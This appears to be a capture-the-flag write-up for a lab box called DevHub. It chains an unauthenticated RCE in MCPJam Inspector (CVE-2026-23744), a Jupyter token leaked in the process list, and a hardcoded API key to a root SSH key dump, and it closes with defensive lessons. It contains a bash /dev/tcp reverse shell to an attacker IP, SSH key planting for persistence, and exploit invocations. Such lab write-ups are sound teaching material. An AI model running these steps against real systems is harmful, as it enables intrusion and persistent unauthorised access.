DevHub is a Linux box exposing an internet-facing instance of MCPJam Inspector, an MCP development tool vulnerable to an unauthenticated remote-code-execution bug (CVE-2026-23744) that gives a foothold as `mcp-dev`. A Jupyter server bound to loopback, reached through an SSH tunnel and unlocked with a token leaked in the process list, provides code execution as `analyst` for the user flag. Root falls to a hardcoded API key readable in a second internal MCP-flavoured service, whose "emergency recovery" function hands over the root SSH private key on request.

`Not shown: 65532 filtered tcp ports (no-response)` is a different signature than a typical scan: ports that are simply unused normally come back closed (RST), but "filtered" with no response means something is silently dropping probes — a host-based firewall permitting only a short allow-list of ports, rather than the OS naturally closing what's not listening. The redirect nmap couldn't follow on port 80 is the usual name-based virtual-hosting tell, so `devhub.htb` went into `/etc/hosts` — it mattered later for the exploit script and the final SSH logins, even though port 80 itself turned out to be a dead end.

Port 6274 is the interesting one. Nmap's version detection fires a battery of protocol-specific probes to fingerprint an unknown service — DNS status/version requests, an RPC check, a TLS session request, a generic HTTP GET, an HTTP OPTIONS, an RTSP request. Every single one of them came back as either an HTTP 400 or a full HTTP response, regardless of the protocol it was framed for. That's the signature of a plain HTTP server sitting on a non-standard port: it doesn't understand any of those framings as anything other than malformed HTTP. The `GetRequest` probe happened to return a complete page, and its `<title>MCPJam Inspector</title>` named the technology outright.

### MCPJam Inspector — Port 6274

Browsing to the service directly landed on its settings page:

![MCPJam Inspector's Settings page, showing version v1.4.2 and configurable LLM provider API keys](/assets/img/HTB/DevHub/cap1.png)

**MCPJam Inspector v1.4.2**, confirmed straight from the UI. MCPJam Inspector is a Node.js-based debugging and testing tool for the **Model Context Protocol (MCP)** — a specification Anthropic introduced in late 2024 for standardising how LLM-based agents talk to external tools, data sources, and other agents. MCP servers implement the protocol; MCPJam Inspector is a client built to connect to them and exercise their capabilities during development.

Version 1.4.2 sits squarely in the range flagged by a public advisory: **CVE-2026-23744**, with a public PoC at [`github.com/alisster00/CVE-2026-23744-RCE`](https://github.com/alisster00/CVE-2026-23744-RCE).

## Exploitation

### CVE-2026-23744 — MCPJam Inspector Unauthenticated RCE

MCP servers are ordinarily local processes: a client like Inspector launches them as subprocesses and talks to them over stdio. To support that workflow, Inspector's `/api/mcp/connect` endpoint accepts a `serverConfig` JSON object naming a `command` and `args` to spawn a new server for testing — a legitimate feature for local development. The bug is that versions up to 1.4.2 exposed that endpoint with **no authentication at all** (CWE-306, missing authentication for a critical function), and the application binds to `0.0.0.0` instead of `127.0.0.1` by default, so it's reachable from the network in the first place. Put those two together and the "feature" needs no exploitation beyond using it as designed: anyone who can reach the port can specify any command they want, and Inspector spawns it as a child of its own Node.js process — arbitrary code execution, unauthenticated, no user interaction.

```bash
python3 script.py devhub.htb -l 10.10.15.75 --lport 4444
[*] MCPJam accessible at http://devhub.htb:6274
[*] Target: http://devhub.htb:6274
[*] Callback: 10.10.15.75:4444
[*] Sending payload to /api/mcp/connect...
[+] Payload sent!
[+] Check your listener for reverse shell
```

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 38906
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

The listener caught the callback as `mcp-dev` — a working directory under `/opt/mcpjam/node_modules/@mcpjam/inspector` confirms Inspector was installed as an npm dependency and runs under its own dedicated service account, not as a shared or privileged user. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

### Reaching Jupyter Through an SSH Tunnel

A curl to `127.0.0.1:8888` confirmed a web app answered, but actually using it — and its authentication flow — meant reaching it from a real browser. That meant forwarding the loopback port out through SSH. Rather than fight with a freshly generated keypair, the simplest path was dropping the attacker's own already-existing public key straight into `mcp-dev`'s `authorized_keys`:

```bash
ssh-keygen
Generating public/private rsa key pair.
[...]
```

```bash
# meto mi clave pública al authorized_keys
mcp-dev@devhub:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH90S0Re+wfpOzgkSgo452ECnqrGMhIiUwvGt9ElCKBI ander@monre" > authorized_keys
```

```bash
ssh -i .ssh/id_ed25519 -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb -N
```

`-L 8888:127.0.0.1:8888` forwards the attacker's local port 8888 to `127.0.0.1:8888` as seen from the target; `-N` skips opening a shell, since the tunnel is the only thing needed. Browsing to `localhost:8888` locally now reaches Jupyter as if sitting on the box itself:

![Jupyter's login page reached through the SSH tunnel, showing the token-authentication notice](/assets/img/HTB/DevHub/cap2.png)

Jupyter's login page offers two paths: paste the token directly each time, or spend it once to set a permanent password. The leaked value from `ps -auxfww` went into the **Setup a Password** form together with a new password of the attacker's choosing:

![Entering the leaked Jupyter token and a new password in the Setup a Password form](/assets/img/HTB/DevHub/cap3.png)

That trades a one-shot token for durable, self-chosen credentials — no need to keep the token around or re-read the process list on every visit.

![JupyterLab's workspace after authenticating, showing the file browser and launcher](/assets/img/HTB/DevHub/cap4.png)

### Code Execution via JupyterLab

JupyterLab is an IDE, and an IDE that will run arbitrary code is a code-execution primitive by design — the only question was whose. A new notebook cell settled it:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.15.75/4444 0>&1'")
```

Running the cell executes it inside the kernel's process — as `analyst`, the user the Jupyter server itself runs as:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 53198
bash: cannot set terminal process group (2529): Inappropriate ioctl for device
bash: no job control in this shell
analyst@devhub:~/notebooks$
```

A standard TTY upgrade made the shell usable.

```bash

```

This is the foothold proper — `analyst` holds `user.txt`.

As a fallback in case the notebook session dropped, a second keypair went into `analyst`'s own `authorized_keys` the same way:

### The Lead

Re-checking the process list turned out more useful than the automated output: a second Python service, this time owned by root.

```bash

[...]
root        1065  0.0  0.7  37376 28832 ?        Ss   09:26   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Interesting on two counts — it runs as root, and it's a second internal MCP-flavoured service on the box, sitting next to the MCPJam Inspector that gave the foothold. Its permissions were the first thing worth checking:

```bash
ls -la /opt/opsmcp/server.py
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
```

Owned by `analyst`, group `analyst` — exactly the user already logged in as. The source was open to read.

### Reading the Source

The script backs the service on `127.0.0.1:5000` seen earlier in `netstat`. A first probe confirmed it gates its endpoint:

```bash
curl -X POST http://127.0.0.1:5000/tools/call
{"error":"Unauthorized","message":"Valid X-API-Key header required"}
```

The source explained exactly what that key needed to be — hardcoded in plain sight:

```
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

With the key but no body, the app got far enough to complain about the request shape instead of the auth:

```bash
curl -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a'
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>The browser (or proxy) sent a request that this server could not understand.</p>
```

The rest of the source described the expected body: a `name` naming one of the server's registered "tools" plus an `arguments` object for it. One of those tools, `ops._admin_dump`, was built for emergency credential recovery — its code returned SSH key material for a given `target`, gated only by a `confirm: true` flag. Nothing in the endpoint distinguished a legitimate operator running a real recovery from anyone who'd simply read the same source file the API key came from.

### Triggering the Dump

```bash
curl -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n[...]\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

The response is the root SSH private key, JSON-escaped with literal `\n` sequences standing in for real newlines. Swapping those back in recovers a usable PEM:

```bash
cat raw_id_rsa | sed 's/\\n/\n/g' > id_rsa
chmod 700 id_rsa
ssh -i id_rsa root@devhub.htb
[...]
root@devhub:~# cat root.txt
```

`ops._admin_dump` did exactly what its name promised — dump admin secrets on request — with no check at all on who was asking.

## Key Takeaways

- **A tool built to spawn arbitrary local processes on command is only as safe as the gate in front of it.** CVE-2026-23744 wasn't a memory-corruption bug or a clever bypass — MCPJam Inspector's `/api/mcp/connect` endpoint did precisely what it was designed to do, for whoever asked. Binding to `0.0.0.0` by default turned an already-dangerous local feature into a network-reachable one.
- **Command-line arguments are not a secrets store.** Passing a token or password on invocation puts it in every local user's `ps aux` output for as long as the process runs; the Jupyter token here was visible to any process with no special privilege at all.
- **A leaked one-shot token is often redeemable for something durable.** Given the chance, an attacker will trade a token for a password, a cookie, or a key — a credential that survives rotation or reuse limits, turning a narrow leak into standing access.
- **Hardcoded secrets in group- or world-readable source are secrets in name only.** A plaintext API key in a file `analyst` could read gave `analyst` everything needed to authenticate as if they were the service's intended operator.
- **"Emergency recovery" and "admin" functions are prime privilege-escalation targets.** Any code path whose explicit job is to hand out high-value secrets deserves stronger authentication than the rest of the API — not the same shared key as every other endpoint.
- **A dedicated service account limits blast radius only if nothing downstream trusts it more than it should.** Running MCPJam under its own `mcp-dev` user contained the initial RCE to that account, but the chain kept going anyway: `mcp-dev` could still reach an inadequately-secured `analyst` service, and `analyst` could read a root-owned service's secrets.
